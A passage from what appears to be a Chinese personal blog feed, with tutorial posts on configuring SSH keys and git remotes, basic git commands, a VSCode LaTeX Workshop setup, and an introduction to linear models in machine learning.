          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH 配置与远程仓库连接</title>
      <link href="/blog/2021/10/16/linux/git/git_add_repo/"/>
      <url>/blog/2021/10/16/linux/git/git_add_repo/</url>
      
        <content type="html"><![CDATA[<p>Git 是分布式版本控制系统，实际中可以找一台电脑充当服务器的角色，每天24小时开机，其他每个人都从这个“服务器”仓库克隆一份到自己的电脑上，并且各自把各自的提交推送到服务器仓库里，也从服务器仓库中拉取别人的提交。分布式版本系统的最大好处之一是可以离线工作，联网时提交推送更新即可。</p><p>How to keep your git repository private?</p><ol type="1"><li>github 创建 private 仓库</li><li>自己动手，搭一个 Git 服务器，因为是你自己的 Git服务器，所以别人也是看不见的。公司内部开发必备。</li></ol><h2 id="ssh-配置">SSH 配置</h2><ol type="1"><li><p>SSH 密钥配置</p><ol type="1"><li><p>读取 global级别的配置：<code>git config --global --list</code>,查看是否设置username 和 email</p></li><li><p>使用 <code>ssh-keygen</code> 生成 public/private rsa keypair.</p><p><code>ssh-keygen -t rsa -C "xxx@qq.com"</code>, 后面的邮箱改成 github注册邮箱执行之后会提示一系列操作，注意确认秘钥的保存路径的时候，我一般偏向自己针对网站修改一下，否则后续多个ssh 密钥就不好处理了。</p></li><li><p>添加 rsa 公钥到 github 远程仓库</p><p>github 配置页： Settings -- SSH and GPG keys -- New SSH key,将本地生成的 id_rsa.pub 的内容复制粘贴即可</p></li><li><p>测试是否配置成功</p><p><code>ssh -T git@github.com</code></p></li></ol></li><li><p>本地设置多个 ssh 密钥<strong>解决办法就是：生成两个（或多个）不同的公私密钥对，用 config文件管理它们。</strong> 在 <code>~/.ssh</code> 目录下创建名为<code>config</code> 的文件：</p><p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># gitee and github</span><br><span class="line"># 注意：多个Host公用一个公钥时，</span><br><span class="line"># 对应的HostName和Port必须跟在Host后面</span><br><span class="line">    Host gitee.com</span><br><span class="line">    HostName gitee.com</span><br><span class="line">    Host github.com</span><br><span class="line">    HostName github.com</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line"># gitlab.company.com</span><br><span class="line">Host gitlab.company.com</span><br><span class="line">HostName gitlab.company.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/company_rsa</span><br><span class="line"></span><br><span class="line"># 其他的统一用 id_rsa 文件登陆，或者密码。</span><br><span class="line"># 注意：这里的第二行后面有个 password，就是同时允许密码登陆</span><br><span class="line"># 不然第一次没加公钥，密码也登陆不了，会提示错误：Permission denied (publickey,password).</span><br><span class="line">Host *</span><br><span class="line">PreferredAuthentications publickey,password</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></p><p>参考资料：<a href="https://www.awaimai.com/2200.html">git 配置多个SSH Key</a></p></li></ol><h2 id="本地代码纳入-git-管理并上传至-github">本地代码纳入 git管理，并上传至 github</h2><ol type="1"><li><p>在 github 上手动创建仓库（假设仓库名为：mybackup）</p></li><li><p>初始化本地仓库</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd mybackup</span><br><span class="line">git init</span><br></pre></td></tr></table></figure></p><p><code>git init</code> 将当前目录变成 Git 可以管理的仓库， 具体表现为:执行命令后，在当前目录下生成 <code>.git</code> 目录，是 Git来跟踪管理版本库的。</p></li><li><p>添加文件到暂存区 <code>git add -A</code> 或者<code>git add 文件或文件夹</code></p></li><li><p>提交到本地仓库 <code>git commit -m your comment</code></p><p>-m后面输入的是本次提交的说明，可以输入任意内容，当然最好是有意义的，这样你就能从历史记录里方便地找到改动记录。</p></li><li><p>配置远程仓库<code>git remote add origin https://github.com/YOURGITHUBID/mybackup.git</code></p></li><li><p>将本地仓库 push 到远程仓库<code>git push -u origin master</code></p><p>由于远程库是空的，我们第一次推送<code>master</code>分支时，加上了<code>-u</code>参数，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p></li></ol><h2 id="新建项目直接用-git-管理">新建项目直接用 Git 管理</h2><p>假设代码仓库从零开发，步骤如下</p><ol type="1"><li><p>github 网页新建远程仓库</p></li><li><p>复制仓库链接，使用 git clone 从远程库克隆</p><p>git clone 支持通过 <code>https</code>，<code>ssh</code> 两种协议</p><p>Use a password-protected SSH key. Use Git using the web URL.</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/username/repo_name.git</span><br><span class="line">git clone git@github.com:username/repo_name.git</span><br></pre></td></tr></table></figure></p></li><li><p>如果有必要的话，可以再对当前的仓库设置个人信息。</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --local user.name &quot;your_name&quot;</span><br><span class="line">git config --local user.email &quot;your_email&quot;</span><br></pre></td></tr></table></figure></p><p>注意: local 的个人信息优先级高于 global 的个人信息，即:在设置了global 情况下，再对某个仓库单独设置 local 也是可以。</p></li><li><p>把本地库的所有内容推送到远程库上：<code>git push origin master</code>把本地库的内容推送到远程，用<code>git push</code>命令，实际上是把当前分支<code>master</code>推送到远程。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git 简介, 配置与基本原理</title>
      <link href="/blog/2021/09/16/linux/git/git_basic/"/>
      <url>/blog/2021/09/16/linux/git/git_basic/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>Git 当初是 Linus 为了管理 Linux 代码，用 C语言写的一个分布式版本控制系统</p><ul><li>Git 是全平台的（Linux、Unix、Mac、Windows)</li><li>所有的版本控制系统，其实只能跟踪文本文件的改动，比如 TXT文件，网页，所有的程序代码、markdown 等等，而word、图片、视频等二进制格式的文件无法被跟踪改动，只是知道改动大小而已。</li><li>因为文本是有编码的，比如中文有常用的 GBK 编码，日文有 Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的 UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。</li></ul><h3 id="分布式与集中式">分布式与集中式</h3><p>CVS 及 SVN 都是集中式的版本控制系统，由于 CVS自身设计的问题，会造成提交文件不完整，版本库莫名其妙损坏的情况。同样是开源而且免费的SVN 修正了 CVS的一些稳定性问题，是目前用得最多的集中式版本库控制系统。而 Git则是目前最流行的分布式版本控制系统。</p><h3 id="集中式版本控制系统">集中式版本控制系统</h3><p>集中式版本控制： 从中央服务器取 -&gt; 修改 -&gt; 推送给中央服务器缺点：</p><ol type="1"><li>集中式版本控制系统最大的毛病就是必须联网才能工作，如果在局域网内还好，带宽够大，速度够快，可如果在互联网上，遇到网速慢的话，可能提交一个10M 的文件就需要 5 分钟</li><li>中央服务器出问题，该项目就停滞了</li></ol><h3 id="分布式版本控制系统">分布式版本控制系统</h3><p>分布式版本控制系统根本没有“中央服务器”，每个人的电脑上都是一个完整的版本库分布式版本控制系统通常也有一台充当“中央服务器”的电脑，但这个服务器的作用仅仅是用来方便“交换”大家的修改，没有它大家也一样干活，只是交换修改不方便而已。</p><p>Git 推崇的频繁且详细描述的提交，而不是确认无 Bug 才提交。</p><p>优点：</p><ol type="1"><li>不需要联网，就可以工作，只需要在联网后推送上去即可</li><li>一份拷贝坏掉，只需从别的地方再拷贝一份即可</li><li>Git 具有极其强大的分支管理</li></ol><h2 id="最小化配置">最小化配置</h2><p>配置参与项目开发人员的 user.name 和 user.email,便于在出现代码变更等情况时， git服务器可以及时地通过邮件进行提醒。（因此，邮箱需要是一个你能够及时接收到信息的邮箱）如果你忘记了进行该配置，后续在 git做变更提交的时候，会提示你进行该配置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;your_name&quot;</span><br><span class="line">git config --global user.email &quot;your_email&quot;</span><br></pre></td></tr></table></figure><p><code>your_name</code> 和 <code>your_email</code>根据自己的信息填写。一般我就写 github 的用户名和邮箱。</p><h3 id="config-的三个作用域">config 的三个作用域</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --local</span><br><span class="line">git config --global</span><br><span class="line">git config --system</span><br></pre></td></tr></table></figure><p>local 只对某个仓库有效 global 对当前用户所有仓库有效 system对系统所有登录的用户有效</p><p>显示 config 的配置， 加 <code>--list</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --list --local</span><br><span class="line">git config --list --global</span><br><span class="line">git config --list --system</span><br></pre></td></tr></table></figure><h2 id="工作区暂存区与版本库">工作区,暂存区与版本库</h2><p>Git 管理的文件分为：工作区（WorkingDirectory），版本库（Repository）。 版本库又分为暂存区 stage（或者叫index）和 Git 为我们自动创建的第一个分支 master，以及指向 master的一个指针叫 HEAD。</p><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314170717871.png"alt="image-20200314170717871" /> <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204301588227262697.png"alt="git sectors" /></p><p>工作区 working directory --&gt; 暂存区 stage --&gt; 仓库Repository</p><ul><li><p><code>git add</code> 将工作区 working directory 的文件纳入 git的暂存区 stage 进行索引(index)，<code>git commit</code> 把文件从暂存区--&gt; 仓库，</p><ol type="1"><li><p><code>git add filename1 foldername</code>显式指定文件或文件夹名，进行添加</p></li><li><p><code>git add *.md</code> 使用通配符添加满足条件的文件</p></li><li><p><code>git add -u</code></p><blockquote><p>Update the index just where it already has an entry matching<code>&lt;pathspec&gt;</code>. This removes as well as modifies indexentries to match the working tree, but adds no new files.</p><p>If no <code>&lt;pathspec&gt;</code> is given when -u option is used,all tracked files in the entire working tree are updated</p></blockquote><p>修改、删除已被 stage 索引的项，但不会将新增文件纳入 stage 进行index.</p></li><li><p><code>git add -A</code></p><blockquote><p>Update the index not only where the working tree has a file matching<code>&lt;pathspec&gt;</code> but also where the index already has anentry. This adds, modifies, and removes index entries to match theworking tree.</p><p>If no <code>&lt;pathspec&gt;</code> is given when -A option is used,all files in the entire working tree are updated</p></blockquote><p>更新已被 stage 索引的项，并将新增文件纳入 stage 索引。</p></li></ol></li><li><p><code>git diff</code> 查看工作区和暂存区差异</p></li><li><p><code>git diff filename</code>: 比较工作区和暂存区</p></li><li><p><code>git diff --cached</code> 查看暂存区和仓库差异，</p></li><li><p><code>git diff HEAD</code> 查看工作区和仓库的差异，</p></li><li><p><code>git diff HEAD -- filename</code>命令可以查看工作区和仓库里面最新版本的区别</p></li><li><p><code>git add</code> 的反向命令:</p><p>旧命令：<code>git checkout -- &lt;filename&gt;</code> 可以用新命令<code>git restore &lt;filename&gt;</code> 替代，撤销工作区修改，即把暂存区最新版本转移到工作区，<code>git checkout -- file</code> 命令中的 <code>--</code> 很重要，没有<code>--</code>，就变成了“切换到另一个分支”的命令，我们在后面的分支管理中会再次遇到<code>git checkout</code> 命令。</p></li><li><p>查看 git 版本：<code>git --version</code></p></li><li><p><code>git status</code> 查看工作区的状态</p></li><li><p>如果 <code>git status</code> 告诉你有文件被修改过，用<code>git diff</code> 可以查看修改内容。</p></li></ul><h3 id="帮助手册">帮助手册</h3><p>以 <code>git log</code> 为例: 1. <code>git log --help</code> 查看 gitlog 的帮助。 2. <code>git help log</code></p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://git201901.github.io/github_pages_learning/">github_pages_learning</a></li><li><ahref="http://marklodato.github.io/visual-git-guide/index-en.html">AVisual Git Reference</a></li><li><ahref="https://blog.csdn.net/u010412719/article/details/72860193">github新建本地仓库并将代码提交到远程仓库</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电脑上 配置与使用 LaTex 配置</title>
      <link href="/blog/2021/09/16/misc/latex/latex_config_use/"/>
      <url>/blog/2021/09/16/misc/latex/latex_config_use/</url>
      
        <content type="html"><![CDATA[<p>在 windows 上，可以配置 TeXlive + tex studio，TeXstudio类似集成开发环境，是一个功能强大的 LaTeX 编辑器，就是颜值有点丑。</p><p>在 macos 上，可以配置 <a href="https://www.texpad.com/">texpad</a> +mathpad，texpad 是一款颜值高的 LaTeX 编辑器，mathpad 写公式方便。macos使用 texpad 还需要下载 MacTeX，MacTeX is a package which installs TeXLive on the Macintosh.</p><h2 id="通用">通用</h2><ol type="1"><li><p><a href="https://www.overleaf.com/">overleaf 在线</a> 优点：1.即开即用 3. 可以网上共享，修改缺点：编译时长有限制，高质量图片放多了，编译不出来需要开会员。</p></li><li><p>[Recommend]使用 vscode + latex workshop vscode 配置参考： <ahref="https://www.zhihu.com/question/19954023/answer/676316395">有哪些好的LaTeX 编辑器？ - 黄盼的回答 - 知乎</a> <ahref="https://blog.slkun.me/2018/11/vscode-latex.html">利用 VSCode构建简单的&gt;<span class="math inline">\(\LaTeX\)</span>&lt;编辑器 -理想化盛夏计划</a></p></li></ol><p>本人主要采用 vscode + latex workshop， 配置如下，一般直接下载texlive，然后安装 latex workshop 插件，把配置复制到 vscode 的 setting中即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&quot;latex-workshop.latex.autoBuild.run&quot;: &quot;never&quot;,</span><br><span class="line">&quot;latex-workshop.showContextMenu&quot;: true,</span><br><span class="line">&quot;latex-workshop.intellisense.package.enabled&quot;: true,</span><br><span class="line">&quot;latex-workshop.message.error.show&quot;: true,</span><br><span class="line">&quot;latex-workshop.message.warning.show&quot;: false,</span><br><span class="line">&quot;latex-workshop.latex.tools&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;xelatex&quot;,</span><br><span class="line">        &quot;command&quot;: &quot;xelatex&quot;,</span><br><span class="line">        &quot;args&quot;: [</span><br><span class="line">            &quot;-shell-escape&quot;,</span><br><span class="line">            &quot;-synctex=1&quot;,</span><br><span class="line">            &quot;-interaction=nonstopmode&quot;,</span><br><span class="line">            &quot;-file-line-error&quot;,</span><br><span class="line">            &quot;%DOC%&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;pdflatex&quot;,</span><br><span class="line">        &quot;command&quot;: &quot;pdflatex&quot;,</span><br><span class="line">        &quot;args&quot;: [</span><br><span class="line">            &quot;-shell-escape&quot;,</span><br><span class="line">            &quot;-synctex=1&quot;,</span><br><span class="line">            &quot;-interaction=nonstopmode&quot;,</span><br><span class="line">            &quot;-file-line-error&quot;,</span><br><span class="line">            &quot;%DOC%&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;latexmk&quot;,</span><br><span class="line">        &quot;command&quot;: &quot;latexmk&quot;,</span><br><span class="line">        &quot;args&quot;: [</span><br><span class="line">            &quot;-shell-escape&quot;,</span><br><span class="line">            &quot;-synctex=1&quot;,</span><br><span class="line">            &quot;-interaction=nonstopmode&quot;,</span><br><span class="line">            &quot;-file-line-error&quot;,</span><br><span class="line">            &quot;-pdf&quot;,</span><br><span class="line">            &quot;-outdir=%OUTDIR%&quot;,</span><br><span class="line">            &quot;%DOC%&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;bibtex&quot;,</span><br><span class="line">        &quot;command&quot;: &quot;bibtex&quot;,</span><br><span class="line">        &quot;args&quot;: [&quot;%DOCFILE%&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">],</span><br><span class="line">&quot;latex-workshop.latex.recipes&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;pdflatex -&gt; bibtex -&gt; pdflatex*2&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;pdflatex&quot;, &quot;bibtex&quot;, &quot;pdflatex&quot;, &quot;pdflatex&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;XeLaTeX&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;xelatex&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;PDFLaTeX&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;pdflatex&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;BibTeX&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;bibtex&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;LaTeXmk&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;latexmk&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;xelatex -&gt; bibtex -&gt; xelatex*2&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;xelatex&quot;, &quot;bibtex&quot;, &quot;xelatex&quot;, &quot;xelatex&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line">&quot;latex-workshop.latex.clean.fileTypes&quot;: [</span><br><span class="line">    &quot;*.aux&quot;,</span><br><span class="line">    &quot;*.bbl&quot;,</span><br><span class="line">    &quot;*.blg&quot;,</span><br><span class="line">    &quot;*.idx&quot;,</span><br><span class="line">    &quot;*.ind&quot;,</span><br><span class="line">    &quot;*.lof&quot;,</span><br><span class="line">    &quot;*.lot&quot;,</span><br><span class="line">    &quot;*.out&quot;,</span><br><span class="line">    &quot;*.toc&quot;,</span><br><span class="line">    &quot;*.acn&quot;,</span><br><span class="line">    &quot;*.acr&quot;,</span><br><span class="line">    &quot;*.alg&quot;,</span><br><span class="line">    &quot;*.glg&quot;,</span><br><span class="line">    &quot;*.glo&quot;,</span><br><span class="line">    &quot;*.gls&quot;,</span><br><span class="line">    &quot;*.ist&quot;,</span><br><span class="line">    &quot;*.fls&quot;,</span><br><span class="line">    &quot;*.log&quot;,</span><br><span class="line">    &quot;*.fdb_latexmk&quot;</span><br><span class="line">],</span><br><span class="line">&quot;latex-workshop.latex.autoClean.run&quot;: &quot;onBuilt&quot;,</span><br><span class="line">&quot;latex-workshop.latex.recipe.default&quot;: &quot;lastUsed&quot;,</span><br><span class="line">&quot;latex-workshop.view.pdf.internal.synctex.keybinding&quot;: &quot;double-click&quot;,</span><br><span class="line">&quot;latex-workshop.view.pdf.viewer&quot;: &quot;tab&quot;,</span><br><span class="line">&quot;latex-workshop.latexindent.path&quot;: &quot;/Library/TeX/texbin/latexindent&quot;,</span><br><span class="line">&quot;[latex]&quot;: &#123;</span><br><span class="line">    &quot;editor.formatOnSave&quot;: false</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> latex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性模型概述</title>
      <link href="/blog/2021/07/19/ml/3.linear_model/"/>
      <url>/blog/2021/07/19/ml/3.linear_model/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>给定由 d 个属性描述的示例<spanclass="math inline">\(\boldsymbol{x}=\left(x_{1} ; x_{2} ; \ldots ;x_{d}\right)\)</span>， 其中<span class="math inline">\(x_{i}\)</span>是<span class="math inline">\(\boldsymbol{x}\)</span> 在第 i个属性上的取值，线性模型(linearmodel)试图学得一个通过属性的线性组合来进行预测的函数，即 <spanclass="math display">\[f(x)=w_{1} x_{1}+w_{2} x_{2}+\ldots+w_{d}x_{d}+b\]</span> 一般用向量形式写成: <spanclass="math display">\[f(x)=\textbf{w}^{T}\textbf{x}+b\]</span></p><ul><li><strong>ω</strong>直观表达了各属性在预测中的重要性，因此线性模型有很好的可解释性</li><li>许多功能更为强大的非线性模型(nonlinearmodel)可在线性模型的基础上通过引入层级结构或高维映射而得.</li></ul><p>本章介绍几种经典的线性模型，先从回归任务开始，然后讨论二分类和多分类任务。</p><h2 id="线性回归">线性回归</h2><p>线性回归(linearregression)试图学得一个线性模型以尽可能准确地预测实值输出标记。</p><p>线性模型（linearmodel）试图通过对所给的属性/特征的线性组合进行学习，进而得出一个预测函数。线性模型既可以用作分类问题，又可以用作回归类问题。在回归类问题中，通过属性组合来拟合一个线性函数，在分类问题当中，通过属性组合确定一个分类边界。</p><ol type="1"><li><p>有序无序属性的数学转化对离散属性，若属性值间存在”序“(order)关系，可通过连续化将其转化为连续值，例如二值属性“身高”的取值“高”、”矮“可转化为{1.0，0.0},三值属性"高度"的取值"高" "中" "低",可转化为{1.0，0.5，0.0};</p><p>若属性值间不存在序关系，假定有 k 个属性值，则通常转化为 k维向量，例如属性“瓜类”的取值"西瓜"、"南瓜"、"黄瓜"可转化为(0,0,1)，(0,1,0)，(1,0,0)。</p><p>若将无序属性连续化，则会不恰当地引入序关系，对后续处理如距离计算等造成误导</p></li><li><p>最小二乘法</p><p>均方误差是回归任务中最常用的性能度量，因此我们可试图让均方误差最小化。均方误差对应了欧几里得距离或简称"欧氏距离"(Euclideandistance)。基于均方误差最小化来进行模型求解的方法称为"最小二乘法" (leastsquare method).</p><p>在线性回归中，最小 A乘法就是试图找到一条直线，使所有样本到直线上的欧氏距离之和最小。</p><p>求解 ω 和 b 使<span class="math inline">\(E_{(w,b)}=\sum_{i=1}^{m}\left(y_{i}-wx_{i}-b\right)^{2}\)</span>最小化的过程，称为线性回归模型的最小二乘“参数估计”(parameter estimation).</p><p><span class="math display">\[\begin{aligned}\left(w^{*}, b^{*}\right) &amp;=\underset{(w, b)}{\arg \min }\sum_{i=1}^{m}\left(f\left(x_{i}\right)-y_{i}\right)^{2} \\&amp;=\underset{(w, b)}{\arg \min } \sum_{i=1}^{m}\left(y_{i}-wx_{i}-b\right)^{2}\end{aligned}\]</span></p></li><li><p>对数线性回归与广义线性回归 <span class="math inline">\(\lny=\boldsymbol{w}^{\mathrm{T}} \boldsymbol{x}+b\)</span></p><p>该式在形式上仍是线性回归，但实质上已是在求取输入空间到输出空间的非线性函数映射。这里的对数函数起到了将线性回归模型的预测值与真实标记联系起来的作用。</p><p>考虑单调可微函数<span class="math inline">\(g(\cdot)\)</span>，令<span class="math inline">\(y=g^{-1}\left(\boldsymbol{w}^{\mathrm{T}}\boldsymbol{x}+b\right)\)</span> 这样得到的模型称为"广义线性模型"(generalized linear model) ，其中函数广义线性祺型的参数估<spanclass="math inline">\(g(\cdot)\)</span>称为"联系函数" (link function).显然,对数线性回归是广义线性模型在<span class="math inline">\(g(\cdot) =ln( \cdot )\)</span>时的特例。</p></li></ol><h2 id="对数几率回归">对数几率回归</h2><p>广义线性模型中.只需找一个单调可微函数将分类任务的真实标记<spanclass="math inline">\(y\)</span>与线性回归模型的预测值联系起来。值.最理想的是"单位阶跃函数" (unit-step function)，但是单位阶跃函数不连续。<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16267070936674.jpg"alt="单位阶跃函数" /></p><p>对数几率函数(logistic function) 正是这样一个常用的替代函数: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16267071371754.jpg"alt="logistic function" /></p><p>Sigmoid 函数即形似 S 的函数，对率函数是 Sigmiod函数的最重要的代表。对数几率函数是一种 "Sigmoid 函数"，它将 z值转化为一个接近 0 或 1 的 <span class="math inline">\(y\)</span>值,并且其输出值在 z=0 附近变化很陡。</p><p>这实际上是在用线性回归模型的预测结果去逼近真实标记的对数几率，因此，其对应的模型称为"对数几率归"(logistic regression，亦称 logitregression)。特别需注意到，<strong>虽然它的名字是"回归"，但实际却是一种分类学习方法</strong>。这种方法有很多优点，例如它是直接对分类可能性进行建模，无需事先假设数据分布，这样就避免了假设分布不准确所带来的问题;它不是仅预测出"类别"，而是可得到近似概率预测，这对许多需利用概率辅助决策的任务很有用；此外，对率函数是任意阶可导的凸函数，有很好的数学性质，现有的许多数值优化算法都可直接用于求取最优解.</p><h2 id="线性判别分析">线性判别分析</h2><p>线性判别分析(Linear Discriminant Analysis，简称 LDA)是一种经典的线性学习方法，亦称"Fisher 判别分析”。 LDA 的思想非常朴素:给定训练样例集，设法将样例投影到一条直线上，使得同类样例的投影点尽可能接近、异类样例的投影点尽可能远离;在对新样本进行分类时，将其投影到同样的这条直线上，再根据投影点的位置来确定新样本的类别.</p><h2 id="多分类学习">多分类学习</h2><p>多分类学习任务.有些二分类学习方法可直接推广到多分类，但在更多情形下，我们是基于一些基本策略，利用二分类学习器来解决多分类问题。考虑 N 个类别<span class="math inline">\(C_{1}, C_{2}, \ldots,C_{N}\)</span>，多分类学习的基本思路是"拆解法“，即将多分类任务拆为若干个二分类任务求解。具体来说，先对问题进行拆分，然后为拆出的每个二分类任务训练一个分类器；在测试时，对这些分类器的预测结果进行集成以获得最终的多分类结果。这里的关键是如何对多分类任务进行拆分，以及如何对多个分类器进行集成。最经典的拆分策略有三种："一对一" (One vs. One，简称 OvO)、"一对其余"(One vs. Rest ，简称 OvR)和"多对多" (Many vs. Many，简称 MvM).</p><h2 id="类别不平衡问题">类别不平衡问题</h2><p>类别不平衡(class-imbalance)就是指分类任务中不同类别的训练样例数目差别很大的情况。类别不平衡性处理的基本方法：这就是类别不平衡学习的一个基本策略一"再缩放"(rescaling)/”再平衡（rebalance）”</p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://cs.nju.edu.cn/zhouzh/zhouzh.files/publication/MLbook2016.htm">周志华机器学习</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习样本评估与选择</title>
      <link href="/blog/2021/07/18/ml/3.sample_evaluation/"/>
      <url>/blog/2021/07/18/ml/3.sample_evaluation/</url>
      
